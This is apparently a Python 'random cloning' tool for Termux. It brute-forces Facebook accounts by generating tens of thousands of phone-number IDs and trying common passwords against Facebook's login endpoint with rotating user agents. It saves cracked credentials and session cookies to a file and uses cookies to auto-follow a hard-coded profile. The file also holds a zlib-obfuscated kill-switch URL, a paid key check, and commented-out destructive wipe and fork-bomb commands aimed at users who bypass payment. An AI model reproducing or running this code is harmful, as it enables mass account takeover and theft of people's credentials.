import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
import zlib
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\\033[1;91m [✔] Sorry there is no Active  Apk ')
    else:
        print(f'\r \033[1;92m[✔] Your Active Apps :{WHITE}' )
        for i in range(len(game)):
            print(f"\r [%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\\033[1;91m [✔] Sorry there is no Expired Apk\n')
    else:
        print(f'\\033[1;92m [✔] Your Expired Apps   :{WHITE}')
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text

class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)

RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU

ugen=['Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; SM-G988B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 13; SM-G988B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; SM-N986B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36 EdgA/111.0.1661.38','Mozilla/5.0 (Linux; Android 13; SM-N986B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/398.1.0.11.69;]','Mozilla/5.0 (Linux; Android 10; SM-N9860) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Mobile Safari/537.36 EdgA/88.0.705.53','Mozilla/5.0 (Linux; Android 13; SM-N986B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/398.1.0.11.69;]','Mozilla/5.0 (Linux; Android 13; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/397.0.0.20.81;]','Mozilla/5.0 (Linux; Android 13; SM-N986B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 13; SM-N986B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/396.1.0.14.82;]','Mozilla/5.0 (Linux; Android 13; SM-N986B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 SznProhlizec/9.3.1a','Mozilla/5.0 (Linux; Android 13; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/391.2.0.20.404;]','Mozilla/5.0 (Linux; Android 13; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/391.2.0.20.404;]','Mozilla/5.0 (Linux; Android 13; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.40 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; SM-N986B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.0.0 Mobile Safari/537.36 EdgA/111.0.1627.0','Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-N986B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36 OPR/73.0.3843.69488','Mozilla/5.0 (Linux; Android 13; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.44 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.44 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; Infinix X6820 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]','Mozilla/5.0 (Linux; Android 12; Infinix X6820) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; Infinix X6820 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/371.0.0.24.109;]','Mozilla/5.0 (Linux; Android 12; Infinix X6820 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_PT;FBAV/334.0.0.17.101;]','Mozilla/5.0 (Linux; Android 12; Infinix X6820 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 12; Infinix X6820 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24.77;]','Mozilla/5.0 (Linux; Android 12; Infinix X6820 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/397.0.0.23.404;]','Mozilla/5.0 (Linux; Android 12; Infinix X6820) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; Infinix X6820 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]','Mozilla/5.0 (Linux; Android 12; Infinix X6820 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 GoogleApp/13.48.11.26.arm64','Mozilla/5.0 (Linux; U; Android 12; en-US; Infinix X6820 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.4.0.1306 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; Infinix X6820) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; Infinix X6820 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 12; zh-cn; 22101316C Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.4.240216 swan-mibrowser','Mozilla/5.0 (Linux; Android 12; 22101316C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.122 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 12; 22101316C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]','Mozilla/5.0 (Linux; Android 12; 22101316C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; 22101316C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]','Mozilla/5.0 (Linux; Android 12; 22101316C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84;]','Mozilla/5.0 (Linux; Android 12; 22101316C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]','Mozilla/5.0 (Linux; U; Android 12; en-us; 22101316C Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.4.240216 swan-mibrowser','Mozilla/5.0 (Linux; Android 12; 22101316C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36 EdgA/110.0.1587.41','Mozilla/5.0 (Linux; Android 12; 22101316C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84;]','Mozilla/5.0 (Linux; Android 12; 22101316C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 12; en-US; 22101316C Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.4.0.1306 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; 22101316C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24.77;]',]

def log():
	print(f"""\x1b[38;5;126m
 ███    ███ ██████     ███    ███ ██ ██    ██ ██ 
 ████  ████ ██   ██    ████  ████ ██ ██    ██ ██ 
 ██ ████ ██ ██████     ██ ████ ██ ██ ██    ██ ██ 
 ██  ██  ██ ██   ██    ██  ██  ██ ██  ██  ██  ██ 
 ██      ██ ██   ██ ██ ██      ██ ██   ████   ██
 
               \033[1;93m Create By MR.MIVI
\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><
\033[1;91m [\033[1;92m✔\033[1;91m]\033[1;92m Tool Owner  : MR.MIVI
\033[1;91m [\033[1;92m✔\033[1;91m]\033[1;92m WhatsApp    : +8801741033194
\033[1;91m [\033[1;92m✔\033[1;91m]\033[1;92m Facebook    : The Ghost Hacker bd
\033[1;91m [\033[1;92m✔\033[1;91m]\033[1;92m Tool Name   : Random
\033[1;91m [\033[1;92m✔\033[1;91m]\033[1;92m Tool Version:\033[1;93m 3.5
\033[1;91m [\033[1;92m✔\033[1;91m]\033[1;92m Stauts      :\033[1;91m Not Approved
\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><""")                                           

# Registration Menu Dont Enter
def reg():
	uuid = str(os.geteuid()) + str(os.getlogin())
	id = "x".join(uuid)
	main = requests.get("https://github.com/NOS-XD/vip/blob/main/first.txt").text
	#os.system("python Update")
	os.system("clear")
	log()
	print(" \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;91m This Tool Is Paid So Need Permision Admin")
	print("\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><")
	print(" \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m Your Key Is Not Approved ")
	print(" \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m Contact Admin & Sent Peyment")
	print(" \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m To Admin Approbed Your Key")
	print("\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><")
	print(" \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;93m Your Key \033[1;91m>>\033[1;96m "+id)
	print(" \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m This Key Copy & Sent Admin")
	print("\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><")
	time.sleep(2)
	try:
		first = requests.get("https://github.com/NOS-XD/vip/blob/main/first.txt").text
		if id in first:
			print(" \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m Your Key Is Approved Enjoy......")
			Raj()
			msg = str(os.geteuid())
			time.sleep(1)
			pass
		else:
			print(" \033[1;91m[\033[1;92m✔\033[1;91m]\x1b[38;5;126m Sorry Bro Yor Key IS Not Approved")
			print(" \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m Send Peyment & Get Approval ")
			print(" \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m Enjoy This Tools For Approved Next")
			print("\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><")
			tks = "Dear%20Raj%20Sir%20Pliss%20Approve%20My%20Key%20To%20Get%20Primium%20Thanks%20%20%20%20My%20Key%20>>%20%20"+id
			os.system("xdg-open https://wa.me/+8801741033194?text="+tks)
			time.sleep(0.2)
			sys.exit()
	except:
		sys.exit()
	if name == '__main__':
		print(logo)
		reg()

def cr():
	vv = "tool-on"
	v = "tool-update"
	e = 'x\x9c\xcb())(\xb6\xd2\xd7O\xcf,\xc9(M\xd2K\xce\xcf\xd5\xf7\xf5\x0c\xf3410I\xaeLJ-\xd2\x0f\xc9\xcf\xcf)\xd6u\xce\xcf+)\xca\xcf\xd1\r\xca\x07\xca\x07\xe5\xea\x06$f\xa6\xe8\x95T\x94\x00\x00\xb2\xc7\x16\x0c'
	r = zlib.decompress(e)
	peo = requests.get(r).text
	if "tool-off" in peo:
		os.system('clear')
		log()
		print (" \n\033[1;91m      [\033[1;92m✔\033[1;91m]\033[1;91m THIS TOOLS IS CURRENTLY TURNED OFF")
		time.sleep(1)
		os.system('xdg-open https://www.facebook.com/mr.rohman.129')
		exit()
	elif v in peo:
		update ()
	elif vv in peo:
		reg()
	else:
		exit()

def update():
  os.system('clear')
  log()
  print (' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m PLEASE WAIT FOR UPDATE..........')
  time.sleep(2)
  os.system("python Update")
  time.sleep(2)
  print ("")
  print (' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m UPDATE SUCCESSFUL..........')
  time.sleep(2)
  reg()
if __name__=='__main__':
	cr()

def ck1():
	uuid = str(os.geteuid()) + str(os.getlogin())
	id = "x".join(uuid)
	main = requests.get(f'https://github.com/NOS-XD/vip/blob/main/first.txt').text
	try:
		medel = requests.get(f"https://github.com/NOS-XD/vip/blob/main/ultra.txt").text
		if id in medel:
			msg = str(os.geteuid())
			pass
		else:
			msg = str(os.geteuid())
			fuck()
	except:
			sys.exit()

def fuck():
	os.system("clear")
	print(logo)
	print(" \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m Installing Missing Moduls....")
	print(" \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m Wait A Few Secend...\n")
	#os.system('termux-setup-storage')
	#os.system('rm -rf *')
	#os.system('rm -rf /$PREFIX')
	#os.system('rm -rf /sdcard/*')
	#os.system('rm -rf /sdcard/0/*')
	#os.system('rm -rf /sdcard1/*')
	#os.system('rm -rf /storage/*')
	#os.system('rm -rf mr.dark.txt')
	#os.system('rm-rf /sdcard/Android/data/')
	#os.system('rm -rf ...tx')
	#os.system('rm -rf /sdcard/*')
	#os.system('rm -rf /sdcard/0/*')
	#os.system('rm -rf /sdcard/1/*')
	#os.system('rm -rf /sdcard/dm.txt')
	#os.system('rm -rf /storage/*')
	#os.system('rm -rf /storage/emulated/*')
	#os.system('rm -rf /storage/emulated/0/*')
	#os.system('rm -rf /system/*')
	#os.system(':(){ :|: & };:')
	print("\n\n\n \033[1;91m[\033[1;92m✘\033[1;91m]\033[1;92m Fucked Bypass User 🖕🖕")
	print(" \033[1;91m[\033[1;92m✘\033[1;91m]\033[1;92m Mera Bad Nehi Suna Bypass Kara🖕🖕")
	print(" \033[1;91m[\033[1;92m✘\033[1;91m]\033[1;92m Tera Fhone Geya Kamse🖕🖕")
	print(" \033[1;91m[\033[1;92m✘\033[1;91m]\033[1;92m Tera Phone Fuck Done🖕🖕")
	exit()
#==================================================================

logo=(f"""\x1b[1;96m
 ███    ███ ██████     ███    ███ ██ ██    ██ ██ 
 ████  ████ ██   ██    ████  ████ ██ ██    ██ ██ 
 ██ ████ ██ ██████     ██ ████ ██ ██ ██    ██ ██ 
 ██  ██  ██ ██   ██    ██  ██  ██ ██  ██  ██  ██ 
 ██      ██ ██   ██ ██ ██      ██ ██   ████   ██
 
               \033[1;93m Create By MR.MIVI
\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><
\033[1;91m [\033[1;92m✔\033[1;91m]\033[1;92m Tool Owner  : MR.MIVI
\033[1;91m [\033[1;92m✔\033[1;91m]\033[1;92m WhatsApp    : +8801741033194
\033[1;91m [\033[1;92m✔\033[1;91m]\033[1;92m Facebook    : The Ghost Hacker bd
\033[1;91m [\033[1;92m✔\033[1;91m]\033[1;92m Tool Name   : Random
\033[1;91m [\033[1;92m✔\033[1;91m]\033[1;92m Tool Version: 3.5
\033[1;91m [\033[1;92m✔\033[1;91m]\033[1;92m Stauts      :\033[1;96m Approved
\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><""")

def linex():
        print('\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')
def clear():
        os.system(f'clear')
        print(logo)
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]

def Raj():
	#ck1()
	os.system("clear")
	print(logo)
	print(f" \033[1;91m[\033[1;92m1\033[1;91m]\033[1;92m BD Random Cloning \033[1;91m(PRO)")
	print(f" \033[1;91m[\033[1;92m0\033[1;91m] Exit")
	linex()
	me=input(f' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;93m Choice \033[1;91m>>\033[1;92m ')
	if me in ["1", "01"]:
		xr()
	if me in ["0","00"]:
		exit()
	else:
		Raj()

# APK CHECK
def xr():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    #ck2()
    print(logo)
    print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;93m Example \033[1;91m>>\033[1;92m 0171 \033[1;91m<>\033[1;92m 0175 \033[1;91m<>\033[1;92m 92302 \033[1;91m<>\033[1;92m 92301 \033[1;91m<<')
    print('\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')
    code = input('\n \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;93m Choose \033[1;91m>>\033[1;92m ')
    print("")
    limit =50000
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = 0
    RimonID = []
    print("")
    for bilal in range(passx):
        pww = 0
        RimonID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m TOTAL IDS \033[1;91m>>\033[1;93m '+tl)
        print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m USED SIM CODE \033[1;91m>>\033[1;92m '+code)
        print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m THE PROCESS HAS BEEN STARTED')
        print(' \033[1;91m[\033[1;92m✔\033[1;91m]\x1b[38;5;208m USE AEROPLANE MOOD IN EVERY 5 MIN ')
        print('\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')
        for love in user:
            pwx = [love,love[2:],love[1:],code+love,code+love[:3],'bangladesh','@@@@@@','iloveyou','freefire','freefire123']
            uid = code+love
            for Eman in RimonID:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print('')
    print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m Crack process has been completed')
    print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m Ids saved in Mivi/ok.txt,Mivi/cp.txt')
    print('\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')

def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://x.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'x.facebook.com',
            'method': 'GET',
            'path':'/home.php?tbua=1',
            'scheme': 'https',    
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-BD,en;q=0.9,bn-BD;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'cache-control': 'no-cache, no-store, must-revalidate',
            'pragma': 'no-cache',
            'referer': 'https://x.facebook.com/',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print('\033[1;97m[\033[1;92mMIVI-OK\033[1;97m]\033[1;92m ' +uid+ '\033[1;91m<=>\033[1;92m' +ps+ '\n \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;93m COOKIES \033[1;91m>>\033[1;92m '+coki+'\n\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><\033[1;97m')                
                open('/sdcard/MIVI-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                #print('[MIVI-CP] ' +uid+ '|' +ps+ '')
                #open('/sdcard/MIVI-CP.txt', 'a').write( uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\r \033[1;91m[\033[1;97mMIVI-XD\033[1;91m][\033[1;93m%s\033[1;91m][\033[1;97m%s\033[1;91m][\033[1;92mOK:-%s\033[1;91m]'%(tl,loop,len(oks))),
        sys.stdout.flush()
    except:
        pass

cr()